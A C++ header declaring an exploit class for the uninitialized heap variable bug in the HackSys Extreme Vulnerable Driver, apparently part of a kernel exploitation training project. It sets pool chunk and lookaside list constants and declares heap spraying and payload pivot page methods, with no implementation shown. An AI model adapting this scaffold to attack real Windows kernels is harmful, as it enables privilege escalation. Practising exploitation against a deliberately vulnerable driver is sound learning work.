#pragma once

#include "common.h"
#include "IExploit.h"
#include "HevdConstants.h"


class ExploitUninitializedHeapVariable : public IExploit {
	static constexpr wchar_t *Exploit_Name 	= L"Uninitialized Heap Variable";
	static constexpr DWORD Ioctl_Code 		= HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE;
	
	static constexpr size_t Chunk_Size = 0xf0 + 8;		// 8 for the _POOL_HEADER
	static constexpr size_t Max_Chunks_In_Lookaside_List_Bucket = 512;
	static constexpr size_t Max_Object_Name_Length = (Chunk_Size - 8);
	
public:
	ExploitUninitializedHeapVariable(Driver& driver) : IExploit(driver) {
		srand(static_cast<unsigned>(time(nullptr)));
	}
	
	virtual ~ExploitUninitializedHeapVariable() {	}
	
	virtual const wchar_t* getName() const { 
		return ExploitUninitializedHeapVariable::Exploit_Name;
	};
	
	virtual DWORD getIoctlCode() const {
		return ExploitUninitializedHeapVariable::Ioctl_Code;
	}
	
	virtual bool exploit();
	
private:
	void waitForLookasideLists();
	bool populateLookasideList(PVOID payload);
	ULONG mapUnicodePivotPage(PVOID payload);
};
